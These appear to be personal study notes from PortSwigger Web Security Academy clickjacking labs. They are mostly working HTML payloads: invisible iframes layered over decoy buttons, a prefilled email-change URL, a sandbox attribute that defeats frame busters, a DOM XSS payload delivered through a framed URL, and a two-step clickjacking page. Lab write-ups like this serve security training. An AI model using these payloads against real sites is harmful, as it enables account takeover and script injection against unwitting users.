```html
<style>
    iframe {
        position:relative;
        width: 1000px;
        height: 900px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top:515px;
        left:100px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0af300d9036c700b8038533300ab000b.web-security-academy.net/my-account"></iframe>
```
![232](Pasted%20image%2020261020110710.png)
## Clickjacking with prefilled form input
```html
<style>
    iframe {
        position:relative;
        width: 1000px;
        height: 900px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 465px;
        left:90px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a4b009c045ef6608151436500ce00c8.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```
## Frame busting scripts
Frame busting techniques are often browser and platform specific and because of the flexibility of HTML they can usually be circumvented by attackers. As frame busters are JavaScript then the browser's security settings may prevent their operation or indeed the browser might not even support JavaScript. An effective attacker workaround against frame busters is to use the HTML5 iframe `sandbox` attribute. When this is set with the `allow-forms` or `allow-scripts` values and the `allow-top-navigation` value is omitted then the frame buster script can be neutralized as the iframe cannot check whether or not it is the top window:
`<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>`
Both the `allow-forms` and `allow-scripts` values permit the specified actions within the iframe but top-level navigation is disabled. This inhibits frame busting behaviors while allowing functionality within the targeted site.
```html
<style>
    iframe {
        position:relative;
        width: 1000px;
        height: 900px;
        opacity: 0.00001;
        z-index: 2;
    }
    div {
        position:absolute;
        top: 465px;
        left:90px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a5f00a00445d2f880942bba00020017.web-security-academy.net/my-account?email=hacker@attacker-website.com" sandbox="allow-forms"></iframe>
```
## Combining clickjacking with a DOM XSS attack
The potency of clickjacking is revealed when it is used as a carrier for another attack such as a [DOM XSS](https://portswigger.net/web-security/cross-site-scripting/dom-based) attack. The XSS exploit is then combined with the iframe target URL so that the user clicks on the button or link and consequently executes the DOM XSS attack.
```html
<style>
	iframe {
		position:relative;
		width:900px;
		height: 900px;
		opacity: 0.00001;
		z-index: 2;
	}
	div {
		position:absolute;
		top:800px;
		left:100px;
		z-index: 1;
	}
</style>
<div>Click me</div>
<iframe
src="https://0a9c004a047d07eb8197edeb00d3001c.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```
## Multistep clickjacking
```html
<style>
	iframe {
		position:relative;
		width:900px;
		height: 900px;
		opacity: 0.1;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:500px;
		left:70px;
		z-index: 1;
	}
   .secondClick {
		top:290px;
		left:190px;
	}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://0a9100f50300d46182a09e4300d6007d.web-security-academy.net/my-account"></iframe>
```
